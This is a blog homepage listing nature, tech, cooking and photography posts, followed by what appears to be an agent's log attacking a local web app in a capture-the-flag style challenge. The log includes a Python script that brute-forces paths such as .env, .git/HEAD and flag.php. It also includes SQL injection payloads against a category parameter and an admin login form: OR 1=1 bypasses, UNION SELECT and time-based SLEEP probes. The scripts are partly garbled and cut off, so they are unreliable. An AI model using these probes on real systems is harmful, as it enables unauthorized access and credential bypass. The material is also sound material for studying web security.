Welcome to Our Blog

The Magic of Morning Dew

Category: Nature

Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....

Sunset Serenades

Category: Nature

As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....

Forest Whisperings

Category: Nature

Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....

Decoding Tech Trends

Category: Tech

An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....

The Future of Robotics

Category: Tech

Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....

Mediterranean Diet Secrets

Category: Cooking

Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....

The Art of French Baking

Category: Cooking

Master the art of French baking with these simple steps for making the perfect croissant....

Beyond the Camera Lens

Category: Photography

Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....

Urban Photography Tips

Category: Photography

Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....

The Healing Power of Yoga

Category: Health

Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....

===== /styles.css 200 453 text/css body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 20px; } .container { width: 80%; margin: auto; background: white; padding: 20px; border-radius: 8px; } .post { border-bottom: 1px solid #ccc; padding-bottom: 20px; margin-bottom: 20px; } .post h2 a { color: #333; text-decoration: none; } .post img { width: 100%; height: auto; border-radius: 5px; } --- harvest root links/forms/resources --- href ['styles.css', 'admin.php'] src ['images/morning-dew.jpg', 'images/sunset.jpg', 'images/forest.jpg', 'images/tech-trends.jpg', 'images/robotics.jpg', 'images/mediterranean-diet.jpg', 'images/french-baking.jpg', 'images/camera-lens.jpg', 'images/urban-photography.jpg', 'images/yoga.jpg'] form [''] name ['viewport', 'category'] [stderr] /Users/faber/Library/Python/3.9/lib/python/site-packages/urllib3/__init__.py:35: NotOpenSSLWarning: urllib3 v2 only supports OpenSSL 1.1.1+, currently the 'ssl' module is compiled with 'LibreSSL 2.8.3'. See: https://github.com/urllib3/urllib3/issues/3020 warnings.warn( --- iter 5 bash --- $ python3 - <<'PY' import requests, hashlib, re, itertools, time base='http://127.0.0.1:9100' words=['admin','admin.php','index.php','login','login.php','logout','post','post.php','posts','view','view.php','article','article.php','category','category.php','search','search.php','api','api.php','db','db.php','config','config.php','backup','backup.php','flag','flag.php','secret','secret.php','dashboard','dashboard.php','upload','uploads','images','css','js','assets','.env','.git/HEAD','phpinfo.php','info.php','debug.php','robots.txt','sitemap.xml'] for w in words: url=base+'/'+w try: r=requests.get(url,timeout=3,allow_redirects=False) if r.status_code!=404 or w in ['images']: print(w, r.status_code, len(r.content), r.headers.get('location',''), hashlib.sha256(r.content).hexdigest()[:8], r.text[:120].replace('\n',' ')) except Exception as e: print(w,e) PY admin.php 200 646 b9bb0829 301 Moved Permanently

See: https://github.com/urllib3/urllib3/issues/3020 warnings.warn( --- iter 6 bash --- $ python3 - <<'PY' import requests,time,hashlib,re,urllib.parse base='http://127.0.0.1:9100' probes=[('',{}),('cat Nature',{'category':'Nature'}),('cat Secret',{'category':'Secret'}),('cat quote',{'category':"'"}),('cat bool true',{'category':"Nature' OR '1'='1"}),('cat bool false',{'category':"Nature' AND '1'='2"}),('cat union null',{'category':"Nature' UNION SELECT NULL-- -"})] for name,params in probes: t=time.time(); r=requests.get(base+'/',params=params,timeout=8); dt=time.time()-t print('\n===',name,'status',r.status_code,'len',len(r.text),'time',round(dt,3),'sha',hashlib.sha256(r.content).hexdigest()[:8]) print('posts',r.text.count("class='post'"),'errors',re.findall(r'(SQL[^<]*|Warning[^<]*|Fatal[^<]*|Notice[^<]*)', r.text)[:5]) # print titles/categories if short relevant print(re.findall(r'

(.*?)

|

Category: ([^<]+)

', r.text)[:20]) # admin post probes postprobes=[('base',{'username':'admin','password':'admin'}),('quote user',{'username':"'",'password':'x'}),('or user',{'username':"admin' OR '1'='1'-- -",'password':'x'}),('or pass',{'username':'admin','password':"' OR '1'='1'-- -"}),('sleep user',{'username':"admin' OR SLEEP(3)-- -",'password':'x'}),('sleep pass',{'username':'admin','password':"' admin',name,'ERR',e); continue print('\n=== admin',name,'status',r.status_code,'len',len(r.text),'time',round(dt,3),'sha',hashlib.sha256(r.content).hexdigest()[:8]) print(r.text) PY === status 200 len
